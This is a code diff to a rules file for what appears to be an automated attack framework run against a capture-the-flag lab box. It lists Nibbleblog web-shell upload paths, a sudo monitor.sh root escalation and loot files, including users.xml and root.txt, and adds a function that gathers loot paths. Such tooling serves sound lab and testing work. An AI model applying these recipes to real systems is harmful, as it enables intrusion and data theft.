@@ -30,7 +30,7 @@ RULES: list[dict] = [
         "requires": ["/admin", "credential:admin"],
         "gives": ["web_shell", "file_access"],
         # match as soon as the app is recognized (path signal)
-        # cred requirement is enforced separately via `requires` 
+        # cred requirement is enforced separately via `requires`
         # so try_default_creds can fetch its recipe before any creds exist
         "predicate": lambda host, state: _path_contains(
             state, host["id"], "nibbleblog"
@@ -54,7 +54,10 @@ RULES: list[dict] = [
             "image_option": "auto",
         },
         "shell_path_after_upload": "/nibbleblog/content/private/plugins/my_image/image.php",
-        "loot_files": ["/var/www/html/nibbleblog/content/private/users.xml"],
+        "loot_files": [
+            "/var/www/html/nibbleblog/content/private/users.xml",
+            "/home/nibbler/user.txt",
+        ],
     },
     {
         "id": "VF-JENKINS-001",
@@ -89,6 +92,7 @@ RULES: list[dict] = [
         "trigger_command": "sudo /home/nibbler/personal/stuff/monitor.sh",
         "verify_command": "/bin/bash -p -c 'id'",
         "verify_indicator": r"uid=0",
+        "loot_files": ["/root/root.txt"],
     },
 ]
 
@@ -150,13 +154,34 @@ def vulns_for(host: dict, state: State) -> list[dict]:
     return declared + matched
 
 
+def loot_files_for_discovered(host: dict, state: State, host_id: str) -> list[str]:
+    """
+    Collect loot_files from every vuln we've already discovered on this host
+    regardless of whether its predicate still fires. cause once a vuln is
+    discovered then its loot_files stay reachable even when state changes
+    past the predicates match condition (eg  access_level moves from
+    web_shell to root  so VF-PRIVESC-001's predicate stops firing)
+    """
+    known = state.discovered_vulns.get(host_id, set())
+    paths: list[str] = []
+    sources: list[dict] = list(host.get("vulnerabilities", []))
+    sources.extend(_strip_predicate(r) for r in RULES)
+    for v in sources:
+        if v["id"] not in known:
+            continue
+        for p in v.get("loot_files", []):
+            if p not in paths:
+                paths.append(p)
+    return paths
+
+
 def recipe_for(host: dict, state: State, capability: str) -> dict | None:
     """
     Return the first matched vuln on this host whose `gives` includes capability
 
-    Real executors call this to fetch app specific exploit data 
+    Real executors call this to fetch app specific exploit data
     like (login URLs, upload endpoints, default creds, loot file paths)
-    
+
     Returns None if no matched vuln offers the capability
     The caller should treat that as a recipe
     miss and fail with error='recipe_missing'
